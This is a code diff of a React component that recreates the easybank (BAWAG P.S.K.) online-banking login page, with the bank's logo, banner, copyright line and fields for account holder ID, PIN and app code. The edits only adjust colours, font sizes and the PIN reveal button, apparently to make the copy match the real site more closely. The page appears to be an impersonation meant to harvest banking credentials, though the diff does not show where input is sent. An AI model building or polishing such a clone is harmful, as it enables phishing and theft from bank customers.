@@ -1,5 +1,5 @@
 import { useState, useEffect, useRef, useCallback } from "react";
-import { Eye, EyeOff, ChevronRight } from "lucide-react";
+import { Eye, ChevronRight } from "lucide-react";
 import easybankLogo from "@/assets/logo-easybank_de.png";
 import easybankBanner from "@/assets/EASY26016_login.jpg";
 
@@ -197,7 +197,7 @@ const Easybank = () => {
           <div className="flex gap-4 p-4" style={{ minHeight: "520px" }}>
             {/* Left: Login Card */}
             <div className="w-[370px] flex-shrink-0">
-              <div className="border border-black rounded bg-white">
+              <div className="border border-[#949494] rounded bg-white">
                 {/* Card header */}
                 <div className="px-4 py-3 bg-[#ecf4dc] flex items-center justify-between rounded-t relative">
                   <h1 className="text-sm font-semibold text-black">{t.loginTitle}</h1>
@@ -263,9 +263,9 @@ const Easybank = () => {
                             type="text"
                             value={verfueger}
                             onChange={(e) => setVerfueger(e.target.value)}
-                            className="w-full border border-gray-400 rounded px-3 py-1.5 text-sm focus:outline-none focus:ring-1 focus:ring-[#177991]"
+                            className="w-full border border-gray-400 rounded px-3 py-1.5 text-sm focus:outline-none focus:ring-1 focus:ring-[#4b9920]"
                           />
-                          <p className="text-[10px] text-black mt-1">{t.verfuegerHint}</p>
+                          <p className="text-xs text-black mt-1">{t.verfuegerHint}</p>
                         </div>
                       </div>
 
@@ -278,23 +278,25 @@ const Easybank = () => {
                               type={showPin ? "text" : "password"}
                               value={pin}
                               onChange={(e) => setPin(e.target.value)}
-                              className="w-full border border-gray-400 rounded px-3 py-1.5 text-sm pr-10 focus:outline-none focus:ring-1 focus:ring-[#177991]"
+                              className="w-full border border-gray-400 rounded px-3 py-1.5 text-sm pr-10 focus:outline-none focus:ring-1 focus:ring-[#4b9920]"
                             />
-                            <button
-                              type="button"
-                              onClick={() => setShowPin(!showPin)}
-                              className="absolute right-2 top-1/2 -translate-y-1/2 text-gray-400 hover:text-gray-600"
-                            >
-                              {showPin ? <EyeOff className="h-5 w-5" /> : <Eye className="h-5 w-5" />}
-                            </button>
+                            {!showPin && (
+                              <button
+                                type="button"
+                                onClick={() => setShowPin(true)}
+                                className="absolute right-2 top-1/2 -translate-y-1/2 text-gray-400 hover:text-gray-600"
+                              >
+                                <Eye className="h-5 w-5" />
+                              </button>
+                            )}
                           </div>
-                          <p className="text-[10px] text-black mt-1">{t.pinHint}</p>
+                          <p className="text-xs text-black mt-1">{t.pinHint}</p>
                         </div>
                       </div>
 
                       {/* Login button */}
                       <div className="flex justify-end mb-4">
-                        <button className="px-4 py-1.5 bg-[#177991] text-white text-xs font-semibold rounded hover:bg-[#126a7d] transition-colors">
+                        <button className="px-4 py-1.5 bg-[#177991] text-white text-xs font-bold rounded hover:bg-[#126a7d] transition-colors">
                           {t.loginBtn}
                         </button>
                       </div>
@@ -317,7 +319,7 @@ const Easybank = () => {
                             type="text"
                             value={appInput}
                             onChange={(e) => setAppInput(e.target.value)}
-                            className="w-full border border-gray-400 rounded px-3 py-1.5 text-sm focus:outline-none focus:ring-1 focus:ring-[#177991]"
+                            className="w-full border border-gray-400 rounded px-3 py-1.5 text-sm focus:outline-none focus:ring-1 focus:ring-[#4b9920]"
                           />
                         </div>
                       </div>
@@ -373,7 +375,7 @@ const Easybank = () => {
                         )}
                       </div>
                     </div>
-                    <div className="ml-[28px]">
+                    <div className="ml-[28px] mt-0">
                       <a href="#" onClick={(e) => e.preventDefault()} className="text-xs text-[#4b9920] underline hover:no-underline">
                         {t.warnungLink}
                       </a>
@@ -443,11 +445,11 @@ const Easybank = () => {
           <footer className="bg-white border-t border-gray-200 py-3 px-4">
             <div className="flex flex-wrap gap-3 justify-center">
               {t.footer.map((item, index) => (
-                <a key={item} href={footerUrls[index]} target="_blank" rel="noopener noreferrer" className="text-[11px] text-black underline hover:text-[#8ab528] transition-colors">
+                <a key={item} href={footerUrls[index]} target="_blank" rel="noopener noreferrer" className="text-xs text-black underline hover:text-[#8ab528] transition-colors">
                   {item}
                 </a>
               ))}
-              <span className="text-[11px] text-black">© BAWAG P.S.K.</span>
+              <span className="text-xs text-black">© BAWAG P.S.K.</span>
             </div>
           </footer>
         </div>
